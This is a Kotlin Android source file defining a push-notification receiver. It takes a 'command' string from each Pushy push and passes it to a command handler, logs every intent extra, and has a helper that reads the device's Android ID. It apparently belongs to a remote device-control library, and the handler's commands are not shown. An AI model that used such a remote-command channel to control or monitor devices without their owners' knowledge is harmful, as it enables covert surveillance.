package com.hawkshaw.library.deviceinfo

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import com.hawkshaw.library.App
import com.hawkshaw.library.handler.CommandSource
import com.hawkshaw.library.handler.handleCommandString
import com.hawkshaw.library.logger.Logger
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.buildJsonObject
import android.util.Log // Added for logging
import androidx.annotation.RequiresApi

/**
 * BroadcastReceiver for handling Pushy push notifications
 */
class PushyPushReceiver : BroadcastReceiver() {
    private val TAG = "PushyPushReceiver"

    /**
     * Called when a Pushy push notification is received
     * @param context The broadcast context
     * @param intent The broadcast intent containing the command
     */
    @RequiresApi(Build.VERSION_CODES.P)
    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "[DEBUG] onReceive called. Context: $context, Intent Action: ${intent.action}")
        // Log all extras in the intent
        intent.extras?.let { bundle ->
            for (key in bundle.keySet()) {
                Log.d(TAG, "[DEBUG] onReceive: Intent Extra - Key: $key, Value: ${bundle.get(key)}")
            }
        } ?: Log.d(TAG, "[DEBUG] onReceive: Intent has no extras.")

        // Extract the command string from the intent
        val commandString = intent.getStringExtra("command")
        Log.d(TAG, "[DEBUG] onReceive: Extracted commandString: \"$commandString\"")

        // Handle the command if it exists
        if (commandString != null) {
            Log.d(TAG, "[DEBUG] onReceive: commandString is not null. Calling handleCommandString.")
            Logger.d(TAG, "Received Pushy command: $commandString", false, 4, null) // Existing log
            handleCommandString(commandString, CommandSource.Pushy)
            Log.d(TAG, "[DEBUG] onReceive: handleCommandString finished for command: \"$commandString\"")
        } else {
            Log.w(TAG, "[DEBUG] onReceive: commandString is null. No command to handle.")
            Logger.w(TAG, "Received Pushy notification without command") // Existing log
        }
    }

    /**
     * Converts the data to a JsonObject
     * @return JsonObject representation
     */
    fun toJsonObject(): JsonObject {
        Log.d(TAG, "[DEBUG] toJsonObject called.")
        val jsonObj = buildJsonObject {
            // Add your JSON properties here
            Log.d(TAG, "[DEBUG] toJsonObject: Building JsonObject (currently empty).")
        }
        Log.d(TAG, "[DEBUG] toJsonObject returning: $jsonObj")
        return jsonObj
    }

    /**
     * Gets the Android ID using the content resolver
     * @return Android ID as string
     */
    private fun getAndroidId(): String {
        Log.d(TAG, "[DEBUG] getAndroidId called.")
        val androidId = App.getContext().contentResolver.let { resolver ->
            Log.d(TAG, "[DEBUG] getAndroidId: Getting Settings.Secure.ANDROID_ID.")
            Settings.Secure.getString(resolver, Settings.Secure.ANDROID_ID) ?: ""
        }
        Log.d(TAG, "[DEBUG] getAndroidId returning: \"$androidId\"")
        return androidId
    }
}
